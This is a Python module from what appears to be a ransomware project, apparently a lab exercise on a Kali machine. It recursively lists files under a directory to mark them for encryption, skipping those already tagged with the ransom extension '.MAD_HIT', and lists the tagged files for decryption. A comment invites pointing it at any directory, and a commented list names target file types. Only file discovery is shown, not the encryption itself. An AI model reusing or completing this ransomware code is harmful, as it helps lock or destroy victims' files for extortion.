
from pathlib import Path
from sys import stdout


list_f = []
list_d = []


def write(word):
    stdout.write(word+"                                         \r")
    stdout.flush()
    return True

"""In this function we search the files that we want to encrypt and return then as a list"""
def getfiles_enc():
    # we choose to encrypt and decrypt a specific file , but this can be change to any directory you want
    p = Path('/home/kali/Desktop/rans')
    # ['jpg', 'png', 'jpeg', 'iso','exe', 'mp3', "mp4", 'zip', 'rar', 'txt']

    #Search for encrypted file based on the ransom extension
    extensions = ["*"]
    for extension in extensions:
        try:
            searche = list(p.glob('**/*.{}'.format(extension)))

            for File in searche:
                File = str(File)
                if File.endswith(".MAD_HIT"):
                    pass
                else:
                    #x = x.split("/")[-1]
                    list_f.append(File)
                    # print(x)
        except OSError:
            print("you must be root !")
    return list_f

"""In this function we search the files with the type ".MAD_HIT" that we want to decrypt and return then as a list"""
def getfiles_dec():
    # we choose to encrypt and decrypt a specific file , but this can be change to any directory you want
    p = Path('/home/kali/Desktop/rans')
    #Search for encrypted file based on the extension called ".MAD_HIT"
    extensions = ["*"]
    for extension in extensions:
        try:
            searche = list(p.glob('**/*.{}'.format(extension)))
            for File in searche:
                File = str(File)
                if File.endswith(".MAD_HIT"):
                    list_d.append(File)
                else:
                    pass
        except OSError:
            print("you must be root !")
    return list_d
